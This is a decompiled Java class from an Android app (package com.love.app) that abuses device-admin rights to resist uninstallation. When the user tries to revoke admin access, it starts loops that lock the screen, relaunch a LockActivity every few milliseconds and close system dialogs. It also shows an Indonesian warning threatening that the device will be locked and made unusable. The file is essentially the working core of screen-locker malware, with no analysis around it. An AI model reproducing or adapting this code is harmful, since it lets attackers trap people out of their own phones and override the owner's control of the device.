/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.admin.DeviceAdminReceiver
 *  android.app.admin.DevicePolicyManager
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 *  android.util.Log
 */
package com.love.app;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import com.love.app.AdminReceiver$$ExternalSyntheticLambda0;
import com.love.app.AdminReceiver$$ExternalSyntheticLambda1;
import com.love.app.AdminService;
import com.love.app.LockActivity;

public class AdminReceiver
extends DeviceAdminReceiver {
    private static final String TAG = "AdminReceiver";
    private static boolean isHanging;

    /*
     * Unable to fully structure code
     */
    static /* synthetic */ void lambda$onDisableRequested$0(Context var0) {
        var4_1 = (DevicePolicyManager)var0.getSystemService("device_policy");
        var3_2 = new ComponentName(var0, AdminReceiver.class);
        var1_3 = System.currentTimeMillis();
        while (AdminReceiver.isHanging && System.currentTimeMillis() - var1_3 < 10000L) {
            if (var4_1 == null) ** GOTO lbl9
            try {
                if (var4_1.isAdminActive(var3_2)) {
                    var4_1.lockNow();
                }
lbl9:
                // 4 sources

                var5_4 = new Intent(var0, LockActivity.class);
                var5_4.addFlags(335675392);
                var0.startActivity(var5_4);
                var5_4 = new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS");
                var0.sendBroadcast(var5_4);
                Thread.sleep(10L);
            }
            catch (Exception var5_5) {
                Log.e((String)"AdminReceiver", (String)"lock loop error", (Throwable)var5_5);
            }
        }
    }

    static /* synthetic */ void lambda$startEmergencyHang$1(Context context) {
        while (true) {
            try {
                while (true) {
                    Intent intent = new Intent(context, LockActivity.class);
                    intent.addFlags(0x14000000);
                    context.startActivity(intent);
                    Thread.sleep(100L);
                }
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"emergency hang error", (Throwable)exception);
                continue;
            }
            break;
        }
    }

    private void startEmergencyHang(Context context) {
        new Thread(new AdminReceiver$$ExternalSyntheticLambda1(context)).start();
    }

    public CharSequence onDisableRequested(Context context, Intent intent) {
        Log.d((String)TAG, (String)"onDisableRequested - user mencoba menonaktifkan admin");
        if (!isHanging) {
            isHanging = true;
            intent = new Intent(context, AdminService.class);
            intent.setAction("START_HANG");
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        }
        new Thread(new AdminReceiver$$ExternalSyntheticLambda0(context)).start();
        return "⚠️ PERINGATAN EKSTRIM: Menonaktifkan admin akan mengaktifkan mode darurat! Perangkat akan terkunci total dan tidak bisa digunakan. Batalkan sekarang juga!";
    }

    public void onDisabled(Context context, Intent intent) {
        Log.d((String)TAG, (String)"Device Admin DINONAKTIFKAN - seharusnya dicegah");
        if (!isHanging) {
            isHanging = true;
            this.startEmergencyHang(context);
        }
    }

    public void onEnabled(Context context, Intent intent) {
        Log.d((String)TAG, (String)"Device Admin AKTIF");
        intent = new Intent(context, AdminService.class);
        intent.setAction("START_MONITOR");
        if (Build.VERSION.SDK_INT >= 26) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
        isHanging = false;
    }
}

